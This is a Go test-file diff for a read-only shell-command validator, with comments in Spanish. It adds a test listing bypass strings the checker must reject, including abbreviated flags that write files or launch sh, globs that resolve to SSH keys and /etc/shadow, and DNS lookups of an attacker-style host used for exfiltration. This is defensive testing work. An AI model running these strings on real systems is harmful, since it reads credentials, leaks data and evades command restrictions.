@@ -38,7 +38,8 @@ func TestAllowsReadOnlyCommands(t *testing.T) {
 		"ip -br addr",
 		"ip route get 1.1.1.1",
 		"ip -s link show eth0",
-		"dig example.com",
+		"ps -ef",
+		"getent passwd root",
 		"systemctl --no-pager status nginx",
 		"systemctl status nginx --no-pager",
 		"systemctl --no-pager list-units --failed",
@@ -47,7 +48,6 @@ func TestAllowsReadOnlyCommands(t *testing.T) {
 		"docker images",
 		"docker logs --tail 50 web",
 		"docker stats --no-stream",
-		"docker inspect web",
 		"kubectl get pods -n prod",
 		"kubectl describe pod web-1",
 		"kubectl logs web-1 --tail 100",
@@ -254,4 +254,40 @@ func contains(s, sub string) bool {
 		}
 	}
 	return false
+}
+
+// Casos que se aceptaban y no deberían: abreviaturas de opciones, globs que arman un nombre
+// sensible, DNS como canal de salida y salidas con el entorno de otros procesos.
+func TestRejectsBypasses(t *testing.T) {
+	for _, cmd := range []string{
+		"sort --outp=/tmp/x /etc/hosts",
+		"sort --compress-prog=sh -S 1K /etc/hosts",
+		"journalctl --no-pager --vacuum-t=1s",
+		"journalctl --no-pager --rot",
+		"dmesg --clea",
+		"git --no-pager log --outp=/tmp/x",
+		"git --no-pager diff --ext-d",
+		"git --no-pager grep --open-f=less x",
+		"cat ~/.s?h/id_e*",
+		"cat /etc/sh*dow",
+		"cat /etc/shado[w]",
+		"ls *",
+		"dig abc.atacante.com",
+		"host abc.atacante.com",
+		"nslookup abc.atacante.com",
+		"getent hosts abc.atacante.com",
+		"ps auxeww",
+		"ps eww",
+		"docker inspect web",
+	} {
+		if err := Check(cmd); err == nil {
+			t.Errorf("%q no debería aceptarse como de solo lectura", cmd)
+		}
+	}
+	// Entre comillas el shell no expande: sigue siendo de solo lectura.
+	for _, cmd := range []string{`find /var/log -name '*.log'`, `grep -E "a|b" f`} {
+		if err := Check(cmd); err != nil {
+			t.Errorf("%q debería aceptarse: %v", cmd, err)
+		}
+	}
 }
